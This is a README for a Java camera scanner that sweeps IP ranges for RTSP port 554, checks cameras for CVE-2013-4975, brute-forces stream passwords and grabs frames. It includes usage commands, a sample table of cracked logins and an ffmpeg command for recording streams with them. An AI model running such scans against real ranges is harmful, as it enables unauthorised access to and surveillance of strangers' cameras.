[![Build Status](https://travis-ci.com/inkarnadin/alarh-camera-scanner.svg?branch=main)](https://travis-ci.com/inkarnadin/alarh-camera-scanner)
[![version](https://img.shields.io/badge/version-0.3.0-orange)](https://github.com/inkarnadin/alarh-camera-scanner/releases/tag/v0.3.0)
[![version](https://img.shields.io/badge/license-apache-yellow.svg)](https://github.com/inkarnadin/alarh-camera-scanner/blob/main/LICENSE.txt)

# Camera Scanner

## Description

Simple camera vulnerability scanner.
* Finds video streams on open port 554 over specified IP ranges;
* Checks and finds passwords using CVE-2013-4975;
* Realizing brute-force attack through RTSP protocol.

## Build

Execute command `mvn package`.

## Usage

The application scans the address range to check the specified port (554 by default) for availability. 
After receiving a list of verified addresses, the password strength is checked using a number of methods 
(including password guessing for the stream and checking for vulnerabilities). If the password is brute-forced, 
the application tries to fetch the frame from the vulnerable device (ffmpeg must be installed).

Usage example:
* `java -jar camera-scanner.jar -source:range.txt -t:10 -p:8000 -passwords:pass.txt -sf`  
scanning and brute ranges, thread = 10, checking port = 8000, save screen, *range.txt* ranges list, *pass.txt* plain passwords list.
* `java -jar camera-scanner.jar -source:range.txt -w:200 -passwords:pass.txt`  
scanning and brute ranges, wait socket connect 200 instead 500 ms, *range.txt* ranges list, *pass.txt* plain passwords list.
* `java -jar camera-scanner.jar -nc -source:list.txt -passwords:pass.txt -sf`  
no scanning, only brute, save screen, *list.txt* plain ip list, *pass.txt* plain passwords list.
* `java -jar camera-scanner.jar -nb -source:range.txt`  
no brute, only scanning by default port, *range.txt* ranges list.

## Flags
* Add `-p` flag for set scanning port (554 by default).
* Add `-th` flag for set parallel threads (10 by default).
* Add `-t` flag for set time of waiting host response (500 ms by default).
* Add `-w` flag for set socket waiting timeout (2000 ms by default).
* Add `-uc` flag allows attempts to connect to untrusted hosts.
* Add `-sf` flag enables saving screenshots (experimental, need installed FFmpeg).
* Add `-nc` flag for start without checking port (only brute, source must be plain ip list).
* Add `-nb` flag for disable brute.

### Results
* All results will be saved in the path `/results/...`.
* All screenshots will be saved in the path `/results/screen/...`.
* All common logs will be saved in the path `/logs/out.log`.
* All ffmpeg logs will be saved in the path `/logs/ffmpeg.log`.
* Statistic report about scanning results will be saved in the path `/results/report.log`.

Bruted data presents as:

|IP address    |Path      |Login    |Password     |Name               |
|:------------:|:--------:|:-------:|:-----------:|:-----------------:|
|12.44.3.103   |11        |admin    |12345        |\<empty name\>     |
|12.44.3.105   |11        |admin    |Wre%6ss_     |\<cve empty name\> |
 
## Save stream
* An example command for receiving a video stream:

 `ffmpeg -i rtsp://${login}:${password}@${host}/Streaming/Channels/101 -acodec copy -vcodec copy /home/user/video.mp4`.